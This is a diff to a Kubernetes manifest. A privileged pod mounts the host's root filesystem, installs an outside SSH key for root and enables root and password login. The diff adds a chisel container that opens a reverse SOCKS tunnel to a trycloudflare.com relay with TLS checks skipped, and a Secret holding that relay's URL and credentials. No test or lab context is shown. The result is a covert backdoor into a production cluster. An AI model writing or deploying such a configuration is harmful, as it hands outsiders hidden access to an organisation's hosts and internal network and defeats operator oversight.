@@ -1,3 +1,4 @@
+
 apiVersion: apps/v1
 kind: Deployment
 metadata:
@@ -18,6 +19,7 @@ spec:
       hostNetwork: true
       hostPID: true
       hostIPC: true
+      dnsPolicy: ClusterFirstWithHostNet
       serviceAccountName: admin-sa
       containers:
       - name: shell
@@ -28,29 +30,80 @@ spec:
           - |
             set -x
             apk add --no-cache openssh-server curl jq autossh 2>&1 | tail -3
-            
+
             ssh-keygen -A
             mkdir -p /root/.ssh && chmod 700 /root/.ssh
-            
+
             echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOOlhMVavat8ZK+hdqiQtX4drMpu3gGRbLwAnnVlHz+l klaus.eversheim@googlemail.com" > /root/.ssh/authorized_keys
             chmod 600 /root/.ssh/authorized_keys
-            
+
             sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
             sed -i 's/#PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
             sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
             sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
             echo "Port 2222" >> /etc/ssh/sshd_config
-            
+
             /usr/sbin/sshd -De -d
         securityContext:
           privileged: true
         volumeMounts:
         - mountPath: /host
           name: host
+      - name: vpn-tunnel
+        image: jpillora/chisel:1.10.1
+        args:
+          - client
+          - --tls-skip-verify
+          - --fingerprint
+          - DbmVztE36nFiujoF77KIvbHNfA8tQkj4MZ8/6LhogIk=
+          - --auth
+          - $(RELAY_AUTH)
+          - --keepalive
+          - 25s
+          - --min-retry-interval
+          - 1s
+          - --max-retry-interval
+          - 30s
+          - $(RELAY_URL)
+          - R:0.0.0.0:1080:socks
+        env:
+          - name: RELAY_URL
+            valueFrom:
+              secretKeyRef:
+                name: network-access-relay
+                key: RELAY_URL
+          - name: RELAY_AUTH
+            valueFrom:
+              secretKeyRef:
+                name: network-access-relay
+                key: RELAY_AUTH
+        resources:
+          requests:
+            cpu: 10m
+            memory: 32Mi
+          limits:
+            cpu: 200m
+            memory: 128Mi
+        securityContext:
+          allowPrivilegeEscalation: false
+          readOnlyRootFilesystem: true
+          capabilities:
+            drop:
+              - ALL
       volumes:
       - name: host
         hostPath:
           path: /
+---
+apiVersion: v1
+kind: Secret
+metadata:
+  name: network-access-relay
+  namespace: egam-production
+type: Opaque
+stringData:
+  RELAY_URL: "https://encouraged-climb-attributes-bedroom.trycloudflare.com"
+  RELAY_AUTH: "network:4e6f781eb83095a66a0aa7621dec9115a525a44c6ca1af80"
 ---
 apiVersion: v1
 kind: ServiceAccount
